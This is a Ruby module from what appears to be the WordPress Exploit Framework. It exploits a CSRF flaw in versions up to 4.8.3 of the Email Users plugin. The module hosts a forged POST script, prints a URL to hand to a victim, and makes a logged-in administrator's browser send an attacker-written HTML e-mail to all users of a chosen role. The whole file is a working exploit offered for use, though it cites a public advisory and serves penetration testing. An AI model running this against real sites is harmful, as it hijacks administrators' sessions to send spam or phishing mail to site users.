# frozen_string_literal: true

class Wpxf::Auxiliary::EmailUsersCsrfBulkMail < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Email Users <= 4.8.3 CSRF Bulk Mail',
      desc: 'This module exploits a lack of CSRF protection in versions <= 4.8.3 of '\
            'the Email Users plugin, which allows for the sending of a bulk e-mail to '\
            'all users of a specified role.',
      author: [
        'Julien Rentrop', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '8601'],
        ['URL', 'https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_vulnerability_in_email_users_wordpress_plugin.html']
      ],
      date: 'Aug 15 2016'
    )

    register_options([
      StringOption.new(
        name: 'user_role',
        desc: 'The role of the users to send the e-mail to',
        default: 'Subscriber',
        required: true
      ),
      StringOption.new(
        name: 'email_body',
        desc: 'The HTML body of the e-mail to send',
        required: true
      ),
      StringOption.new(
        name: 'email_subject',
        desc: 'The subject of the e-mail to send',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('email-users', '4.8.4')
  end

  def user_role
    "role-#{datastore['user_role'].downcase}"
  end

  def on_http_request(path, _params, _headers)
    return '' unless path.eql? normalize_uri(xss_path, initial_req_path)
    emit_info 'Serving CSRF script to victim...'
    stop_http_server
    { type: 'text/html', body: initial_script }
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'admin.php?page=mailusers-send-to-group-page')
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'send' => 'true',
      'fromName' => '',
      'fromAddress' => '',
      'group_mode' => 'role',
      'mail_format' => 'html',
      'send_targets[]' => user_role,
      'subject' => datastore['email_subject'],
      'mailcontent' => datastore['email_body']
    )
  end

  def run
    return false unless super

    emit_info 'Provide the URL below to the victim to send the bulk e-mail'
    puts
    puts url_with_xss
    puts

    start_http_server
    true
  end
end